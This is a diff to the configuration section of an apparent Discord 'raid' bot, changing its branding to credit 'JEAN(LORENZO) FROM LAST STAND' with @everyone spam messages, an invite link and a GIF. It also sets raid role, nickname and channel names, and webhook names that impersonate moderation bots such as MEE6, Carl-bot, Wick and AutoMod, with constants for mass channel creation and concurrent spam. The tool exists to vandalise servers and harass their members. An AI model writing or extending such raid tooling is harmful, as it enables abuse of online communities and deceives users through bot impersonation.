@@ -27,9 +27,11 @@ from discord.ext import commands
 
 from utils.state import bot_state
 
-RAID_TAG  = "LAST STAND"
-RAID_LINK = "https://discord.gg/s59zWvzK6c"
-RAID_NAME = f"RAIDED BY {RAID_TAG}"
+RAID_TAG    = "LAST STAND"
+RAID_LINK   = "https://discord.gg/s59zWvzK6c"
+RAID_NAME   = "RAIDED BY JEAN(LORENZO) FROM LAST STAND"
+RAIDER      = "JEAN(LORENZO)"
+RAID_GIF    = "https://cdn.discordapp.com/attachments/827289915388985404/1493954462580998236/EllenJoe.gif"
 
 CHANNEL_CAP      = 490
 CREATORS         = 5
@@ -42,29 +44,36 @@ _SPAM_SEM = asyncio.Semaphore(50)
 _WH_SEM   = asyncio.Semaphore(30)
 
 _MSGS = [
-    f"@everyone 💀 **RAIDED BY {RAID_TAG}** 💀 {RAID_LINK}",
-    f"@everyone ☠️ LAST STAND WAS HERE ☠️ {RAID_LINK}",
-    f"@everyone 🔥 YOUR SERVER HAS BEEN RAIDED 🔥 {RAID_LINK}",
-    f"@everyone ⚔️ LAST STAND RAID ⚔️ {RAID_LINK}",
-    f"@everyone 💥 OBLITERATED BY LAST STAND 💥 {RAID_LINK}",
-    f"@everyone 👑 LAST STAND OWNS THIS SERVER {RAID_LINK}",
-    f"@here 💀 RAIDED BY LAST STAND {RAID_LINK}",
-    f"@here ☠️ LAST STAND RAID IN PROGRESS {RAID_LINK}",
+    f"@everyone 💀 **{RAID_NAME}** 💀 {RAID_LINK}",
+    f"@everyone 💀 **{RAID_NAME}** 💀 {RAID_LINK}\n{RAID_GIF}",
+    f"@everyone ☠️ {RAIDER} FROM LAST STAND WAS HERE ☠️ {RAID_LINK}",
+    f"@everyone ☠️ {RAIDER} FROM LAST STAND WAS HERE ☠️ {RAID_LINK}\n{RAID_GIF}",
+    f"@everyone 🔥 YOUR SERVER HAS BEEN RAIDED BY {RAIDER} 🔥 {RAID_LINK}",
+    f"@everyone 🔥 YOUR SERVER HAS BEEN RAIDED BY {RAIDER} 🔥 {RAID_LINK}\n{RAID_GIF}",
+    f"@everyone ⚔️ {RAID_NAME} ⚔️ {RAID_LINK}",
+    f"@everyone 💥 OBLITERATED BY {RAIDER} FROM LAST STAND 💥 {RAID_LINK}",
+    f"@everyone 💥 OBLITERATED BY {RAIDER} FROM LAST STAND 💥 {RAID_LINK}\n{RAID_GIF}",
+    f"@everyone 👑 {RAIDER} OWNS THIS SERVER | LAST STAND {RAID_LINK}",
+    f"@here 💀 {RAID_NAME} {RAID_LINK}",
+    f"@here ☠️ {RAIDER} RAID IN PROGRESS | LAST STAND {RAID_LINK}",
+    f"@here 🎯 {RAID_NAME}\n{RAID_GIF}",
 ]
 
 _WH_NAMES = [
     "Server Announcement", "Mod Alert", "AutoMod",
     "Carl-bot", "MEE6", "Wick",
-    "LSC Alpha", "LSC Reaper", "LSC Ghost",
+    "LS Alpha", "LS Reaper", "LS Ghost",
+    "JEAN(LORENZO)", "Last Stand",
 ]
 
 _ROLE_NAMES = [
-    "☠️ RAIDED BY LSC", "💀 LAST STAND", "🔥 RAIDED", "⚔️ LSC OWNS YOU",
-    "💥 OBLITERATED", "👑 LSC WAS HERE", "🚨 RAIDED BY LAST STAND",
-    "⚠️ SERVER COMPROMISED", "🔴 LSC RAID", "💣 LAST STAND CLAN",
+    "☠️ RAIDED BY JEAN(LORENZO)", "💀 LAST STAND", "🔥 RAIDED BY LS",
+    "⚔️ LS OWNS YOU", "💥 OBLITERATED", "👑 LS WAS HERE",
+    "🚨 RAIDED BY LAST STAND", "⚠️ SERVER COMPROMISED",
+    "🔴 LS RAID", "💣 JEAN(LORENZO) FROM LS",
 ]
 
-_NICKS = ["RAIDED", "LSC Was Here", "GG no re", "PWNED", RAID_TAG]
+_NICKS = ["RAIDED", "LS Was Here", "GG no re", "PWNED", "JEAN(LORENZO)", RAID_TAG]
 
 
 def _rand(n: int = 4) -> str:
@@ -73,11 +82,11 @@ def _rand(n: int = 4) -> str:
 
 def _ch_name(i: int = 0) -> str:
     opts = [
-        f"raided-by-lsc-{i}",
+        f"raided-by-ls-{i}",
         f"last-stand-{i}",
-        f"lsc-owned-{i}",
-        f"lsc-raid-{i}",
-        f"last-stand-here-{i}",
+        f"ls-owned-{i}",
+        f"ls-raid-{i}",
+        f"jean-lorenzo-{i}",
     ]
     return random.choice(opts)
 
